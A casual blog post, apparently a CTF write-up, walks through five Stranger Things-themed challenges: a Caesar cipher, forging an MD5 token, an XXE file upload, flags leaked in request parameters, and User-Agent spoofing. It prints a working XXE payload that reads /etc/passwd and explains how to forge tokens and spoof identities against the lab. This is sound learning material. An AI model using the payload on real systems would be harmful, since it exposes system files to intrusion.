---
title: upsidectf
published: 2026-03-26
description: 'tHIS IS my ctf write up'
image: 'guide/upsidectfbackground.jpg'
tags: [CTF]
category: 'learning'
draft: false 
lang: 'en'
---

From now on, Long will be a solo ctf player :V. MOstly i will mostly focus on web  !

![image.png](guide/upsidectf0.png)

# **The Old Emperor**

FWI{vw4uw_wk3_m0xuqhb}

Ceasar (a → d ) shift 3

Flag : `CTF{st4rt_th3_j0urney}`

# **RECOVERED LOGS - HAWKINS NATIONAL LABORATORY**

In this ctf, first we connect to the server

![image.png](guide/upsidectf1.png)

using whatever username you want. 

Next asking for option 1. We get the previous message which is also the way to solve the chall

```bash
> 1

--- RECOVERED SYSTEM LOGS ---
[Nov 04] Murray: The Russians are under the mall! I have the blueprints!
[Nov 05] Owens: Brenner, the new token system is a joke. You just take our username, stick the year the lab was founded ('1983') at the end, and run it through a basic MD5 hash?
[Nov 05] Brenner: It is secure enough, Owens. No one knows my Operator ID is exactly 'DrBrenner' anyway.
[Nov 06] Steve: Ahoy! We're out of USS Butterscotch.
[Nov 06] Dustin: Code Red! The Demodogs are in the tunnels!

```

- was founded ('`1983`') at the end
- my Operator ID is exactly '`DrBrenner`' anyway

⇒ `DrBrenner1983`

and run it through a basic MD5 hash !

![image.png](guide/upsidectf2.png)

> `43095647eb9196088480eab17e08605a`
> 

![image.png](guide/upsidectf3.png)

Flag : `CTF{Dr_n0_br3nn3R}`    

# **The Hawkins Breach**

![image.png](guide/upsidectf4.png)

As we can see it upload xml file. It may vuln to `xxe` 

Crafting payload :

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY leak SYSTEM "file:///etc/passwd">  
]>
<subject>
    <name>&leak;</name>
    <status>Missing</status>
</subject>
```

![image.png](guide/upsidectf5.png)

Flag : `CTF{fr13nds_d0nT_l13}` 

# **The Fav Controversy**

![image.png](guide/upsidectf6.png)

When you search for something, it has sent 2 requests that contain 2 parts of the flag in their id parameter.

![image.png](guide/upsidectf7.png)

![image.png](guide/upsidectf8.png)

![image.png](guide/upsidectf9.png)

Flag : `CTF{rcC_k4_d!55_LmA0}`

# **The Gate**

- The challenge provides hints about "Agent" identification and  "Wizard.”
- **Header Check**: Use `curl -I` to inspect the HTTP Response Headers.

![image.png](guide/upsidectf10.png)

Modify the User-Agent to `WizardWill` to spoof the identity requested by the server.

![image.png](guide/upsidectf11.png)

Flag : `CTF{should_i_stay_or_should_i_head}`

HIhi that is it :V bye !!!